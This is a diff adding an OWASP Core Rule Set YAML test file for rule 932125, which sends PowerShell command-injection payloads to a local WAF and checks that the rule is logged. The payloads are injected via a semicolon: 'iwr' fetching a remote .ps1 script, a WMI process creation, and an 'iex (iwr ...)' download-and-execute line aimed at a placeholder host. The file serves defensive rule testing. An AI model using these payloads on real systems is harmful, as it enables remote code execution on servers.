@@ -1,0 +1,55 @@
+---
+meta:
+  author: "0xInfection"
+  enabled: true
+  name: "932125.yaml"
+  description: "Tests to trigger rule 932125"
+tests:
+  - test_title: 932125-1
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "OWASP CRS test agent"
+              Host: "localhost"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            uri: "/get?cmd=%3Biwr%20http://example.com/path/file.ps1"
+            protocol: "http"
+          output:
+            log_contains: id "932125"
+  - test_title: 932125-2
+    desc: "Test for BB finding VYYFBP5V"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "OWASP CRS test agent"
+              Host: "localhost"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            uri: "/get?cmd=%3Biwmi%20-class%20Win32_process%20-name%20Create%20-ArgumentList%20cmd"
+            protocol: "http"
+          output:
+            log_contains: id "932125"
+  - test_title: 932125-3
+    desc: "Test for BB finding VYYFBP5V"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "OWASP CRS test agent"
+              Host: "localhost"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            uri: "/post"
+            data: cmd=;iex (iwr http://10.0.10.10:8000/x.ps1)
+            protocol: "http"
+          output:
+            log_contains: id "932125"
